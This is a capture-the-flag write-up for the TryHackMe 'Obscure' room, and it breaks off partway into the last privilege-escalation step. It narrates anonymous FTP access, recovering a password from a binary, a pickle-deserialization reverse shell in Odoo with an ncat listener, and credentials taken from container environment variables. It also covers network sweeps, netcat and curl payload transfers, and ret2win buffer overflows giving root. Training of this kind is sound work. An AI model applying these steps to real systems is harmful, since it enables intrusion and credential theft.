# Obscure

[Obscure](https://tryhackme.com/room/obscured)

## Solution

- nmap scan: 21, 22, 80

### password

We see from the nmap scan that we can connect using anonymous session with ftp.
In the fpt session we find a `notice.txt` file and an ELF executable called
`password`. From the notice `password` is an application that stores passwords?

Intresting `strings`:

```
SecurePaH
ssword12H
```

We can `chmox +x password` and try to run it. We get the following message:

```
Password Recovery
Please enter your employee id that is in your email
```

If we try to break  the app with a very long string we get `*** stack smashing
detected ***: terminated` so we might not be able to redirect code execution.
We can try to gdb into the executable and try to see if we can somehow exploit
the tool.

Using gdb we can see that the input is compared using strcmp with `971234596`,
which is one of the strings of the executable, and it seems that it is the user
id. We can try to run the executable with that value.

After runnin the `password` tool with the input `971234596` we get
`SecurePassword123!`. This might be useful later. Maybe there is something else
in the code that we can do.

#### Note

We can access the website on port 80. After playing around a bit, I tried to go
to `Manage Databases`. There I tried to run backup and provided the password
that we got from the executable. And it downloaded a zip archive.

Scanning trought the `dump.sql` file I found something interesting `1	t
admin@antisoft.thm		1	3	\N	f	1	\N	\N	2022-07-23 10:52:10.087949
<span data-o-mail-quote="1">-- <br data-o-mail-quote="1">\nAdministrator</span>
$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag`

We can try and see if hashcat finds the same password, but it's not necessary.

### Initial Flag

I searched for odoo on exploitdb (https://www.exploit-db.com/exploits/44064)
and found something that looks promising. This seems to match with the version
that we have and is an actual thing. I spent so much time on that. But it
didn't work first try. I am too deep to not continue on this rabbit hole.
Well, the database anonymous exploit was actually the way to go. I just needed
to try a different connection method. You need to use pickle and pyhton2.7 for
this to work. Basically do the reverse of what happens on the server. After
many experiments, they do pickle.load (no base64, just raw).

1. Open the browser to the <ip> address of the box.
2. Login using `admin@antisoft.thm` and password `SecurePassword123!`.
3. Go to the `Apps` tab.
4. Remove the `Apps` filter and search for `Database Anonymization`.
5. Install the app.
6. Go to the `Settings` tab.
7. Under `Database Anonymization` select `Anonymize database` and then click `Anonymize Database`.
8. Save and refresh the page.
9. Run the python exploit script using your host address `python2.7 odoo_payload.py <host>`.
10. Start a ncat listener `ncat --ssl -vv -l -p 6969`.
11. Under `Database Anonymization` select `Anonymize database`.
12. Upload the `payload.pickle` file that was generated.
13. Click on `Reverse the Database Anonymization`.
14. You are in. Next go to the home directory `/var/lib/odoo` and cat the flag file.

### Odoo Machine

It looks like we are logged in as `odoo` and we are inside a docker container.

1. Enumerate ENV. We can display the environment variables.

```
HOSTNAME=b8a9bbf1f380
DB_PORT=tcp://172.17.0.2:5432
SHLVL=0
DB_ENV_PG_MAJOR=9.4
HOME=/var/lib/odoo
OLDPWD=/var
DB_NAME=/unkkuri-odoo/db
DB_PORT_5432_TCP=tcp://172.17.0.2:5432
DB_ENV_PGDATA=/var/lib/postgresql/data
ODOO_RC=/etc/odoo/odoo.conf
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DB_ENV_PG_VERSION=9.4.26-1.pgdg90+1
DB_ENV_LANG=en_US.utf8
ODOO_VERSION=10.0
PWD=/
DB_PORT_5432_TCP_ADDR=172.17.0.2
DB_ENV_POSTGRES_PASSWORD=unkkuri-secret-pw
DB_ENV_GOSU_VERSION=1.11
TZ=UTC
DB_PORT_5432_TCP_PORT=5432
DB_ENV_POSTGRES_USER=odoo
DB_PORT_5432_TCP_PROTO=tcp
```

2. Enumerate Network.

```
for i in $(seq 1 254); do (ping -c 1 172.17.0.${i} | grep "64 bytes from" | grep -oE "([0-9]{1,3}[\.]){3}[0-9]{1,3}" &); done;
```

Another interesting thing is that there is also a `172.17.0.1` host on the
network. We can run the following to check.

- `172.17.0.1` 21, 22, 80, 4444 `Main Machine`
- `172.17.0.2` 5432 `Postgres Machine`
- `172.17.0.3` `Odoo Machine`

3. Enumerate SUID binaries.

```
find / -type f -perm -4000 -ls 2>/dev/null
```

We find an unusual binary `/ret`.

### Postgres Machine

Nice it looks like we have `psql` so we can try to connect to pg. We can try to
connect to the `main` db. Since we saw this name back when we were in the web
odoo stuff. (Big brain, took me a lot of time to remember the name). I guess
the password is obvious, but it is `unkkuri-secret-pw` look above.

```
psql postgresql://172.17.0.2:5432/main
```

I looked into the schemas but I could not find anything useful.

### Ret Binary. Rooting Odoo Machine

On host `nc -lp 8080 > ret`
On odoo `nc <host> 8080 < /ret`

We can look at the assembly generated (I used gdb). The main function is just a
call to `vuln`. The `vuln` function will print a message and then use the
`gets` function to read into a buffer of size 0x80 (128). We can try to do a
buffer overflow, by providing 0x88 bytes (8 more for the rbp 64bit). And the
program sigsev's.

Using radare, we can list all functions and there is a `win` (`win_addr =
0x00400646`) function. Maybe that is the function that we need to redirect to.
If we dissasemble the win function we can see that it runs `system` on a
string. If we inspect `x/s` that address we can see that the string is
`/bin/sh`.

Generate the payload using the python script `./ret_payload.py`. This will
generate a `payload.bin` file. We need to send this file to the odoo machine
and run ./ret with it as input.

On host `python -m http.server 8080`
On odoo `curl <host>:8080/payload.bin -o /tmp/payload.bin`

Then you can run `./ret < /tmp/payload.bin`. And we succesfully rooted the odoo
machine. You can verify this by doing `cat /root/root.txt`. And get `Well
done,my friend, you rooted a docker container.`

### Main Machine. User

All this binary stuff seems familiar. I tried before to run nmap -sC -sV for
the `Main Machine` and for port 4444 I was getting some weird messages similar
to the ones from ret. If we try to `nc` into the main machine on port 4444, we
get the same messages as for ret. So we can try the same payload.

```
(cat /tmp/payload.bin; cat) | nc 172.17.0.1 4444
```

And we are connected as `zeeshan`. We can get the flag by doing `cat user.txt`.
We also find a ssh private key that we can download so we can connect from host
directly to the main box.

```
ssh -i id_rsa_zeeshan zeeshan@<ip>
```

### Exploit Me. Rooting Main Machine

Again we enumerate for env, suid etc.

We find an interesting suid binary `/exploit_me`, we can assume it is similar
to ret, so we can send it to host for analysis.

```
scp -i zeeshan_id_rsa zeeshan@<ip>:/exploit_me exploit_me
```

If we inspect the assembly of the binary, we can see that there is a buffer of
size 0x20 (32 bytes) that we use for `gets` again. So we need 0x28 (40) bytes
of padding and then we need to redirect the code execution somehow. This time
there is no `win` function. We need to call system ourselves. The binary also
does suid(0) so if we manage to spawn a shell we will be root.
